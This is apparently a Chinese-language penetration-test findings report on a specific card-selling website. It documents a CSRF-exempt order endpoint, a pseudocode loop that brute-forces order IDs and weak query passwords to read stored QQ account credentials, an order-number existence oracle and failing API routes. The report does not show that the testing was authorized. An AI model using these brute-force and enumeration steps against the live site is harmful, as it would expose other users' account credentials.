# xinhe001.lol 深挖 Phase 2 报告
更新时间: 2026-07-09 16:15 UTC

## 本轮新发现

### 1. [Critical] CSRF 白名单确认 — `order`/`query` 无需 token

`assets/js/csrf.js` 明文列出免 CSRF 的 ajax act:

```javascript
var noCsrfActions = [
  'getcount', 'getclass', 'gettool', 'gettoolnew', 'getleftcount',
  'checklogin', 'getshuoshuo', 'getshareid', 'gift_start',
  'query', 'order',           // ← 订单查询/详情无需 CSRF
  'cart_info', 'cart_list', 'captcha'
];
```

**影响**: `POST ajax.php?act=order {id,skey}` 可直接跨站/脚本爆破，无 CSRF 阻碍。

---

### 2. [Critical] skey = 「取卡密码」— 可爆破

购买页 tid=9 `inputname="取卡密码"`，即用户自设查询密码 = query.js 中的 `skey`。

攻击模型:
```
for id in 1..N:
  for pwd in [123456, 888888, test, ...]:
    POST ajax.php?act=order  id={id}&skey={pwd}
    if code==0 → 读取 data.kminfo (QQ账密)
```

脚本: `xinhe_idor.py`

### 4. [Med] submit.php 订单号存在性探测

```
GET other/submit.php?type=alipay&orderid={trade_no}
```

| orderid | 响应 |
|---------|------|
| 1, 100, 1000, 20250709... | `该订单号不存在` |

**与 getshop.php 对比**:
- getshop: 一律 `{"code":-1,"msg":"未付款"}` — **无枚举差异**
- submit: 区分「不存在」vs 跳转支付页 — **存在性 oracle**（需找到有效 trade_no 格式验证）

trade_no 由 `ajax.php?act=pay` 返回，格式待抓包确认。

### 5. [Med] api.php 全面 500

| 请求 | 响应 |
|------|------|
| `api.php` | `{"code":-5,"msg":"No Act!"}` |
| `api.php?act=*` (任意) | **HTTP 500** |

API 路由存在但实现异常，可能存在:
- 未处理异常导致堆栈泄露 (需 Accept: application/json + 错误显示)
- 缺少必填参数 `key`/`pid` 导致 fatal
